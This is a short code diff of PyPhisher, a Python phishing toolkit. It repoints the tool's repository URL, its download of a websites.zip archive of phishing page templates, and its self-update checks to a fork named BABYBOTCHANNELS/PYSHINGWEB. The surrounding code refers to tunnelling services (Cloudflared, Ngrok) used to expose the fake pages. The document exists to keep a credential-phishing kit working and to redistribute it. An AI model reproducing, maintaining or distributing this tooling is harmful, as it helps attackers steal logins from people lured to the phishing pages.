@@ -193,8 +193,8 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = ""
-websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
+repo_url = "https://github.com/BABYBOTCHANNELS/PYSHINGWEB"
+websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/BABYBOTCHANNELS/PYSHINGWEB/releases/latest/download/websites.zip" 
 
 # CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun
 
@@ -941,13 +941,13 @@ def updater():
     if not isfile("files/pyphisher.gif"):
         return
     try:
-        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
+        git_ver = get("https://raw.githubusercontent.com/BABYBOTCHANNELS/PYSHINGWEB/main/files/version.txt").text.strip()
     except Exception as e:
         append(e, error_file)
         git_ver = version
     if git_ver != "404: Not Found" and float(git_ver) > float(version):
         # Changelog of each versions are seperated by three empty lines
-        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
+        changelog = get("https://raw.githubusercontent.com/BABYBOTCHANNELS/PYSHINGWEB/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
         print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
         upask=input(f"\n{ask}Do you want to update \x50\x79\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
